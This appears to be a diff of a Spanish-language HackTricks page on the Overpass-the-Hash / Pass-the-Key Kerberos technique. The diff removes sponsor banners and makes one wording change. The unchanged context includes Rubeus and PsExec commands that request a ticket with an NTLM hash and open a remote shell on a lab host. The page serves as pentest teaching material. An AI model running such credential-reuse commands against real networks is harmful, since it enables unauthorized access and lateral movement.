@@ -2,9 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## Overpass The Hash/Pass The Key (PTK)
 
@@ -22,7 +19,7 @@ Para escenarios que requieren AES256, se puede utilizar la opción `-aesKey [AES
 
 Los problemas encontrados como _PyAsn1Error_ o _KDC cannot find the name_ se resuelven típicamente actualizando la biblioteca Impacket o utilizando el nombre de host en lugar de la dirección IP, asegurando la compatibilidad con el KDC de Kerberos.
 
-Una secuencia de comandos alternativa utilizando Rubeus.exe demuestra otro aspecto de esta técnica:
+Una secuencia de comandos alternativa usando Rubeus.exe demuestra otro aspecto de esta técnica:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
@@ -37,8 +34,5 @@ Para conformarse a la seguridad operativa y usar AES256, se puede aplicar el sig
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
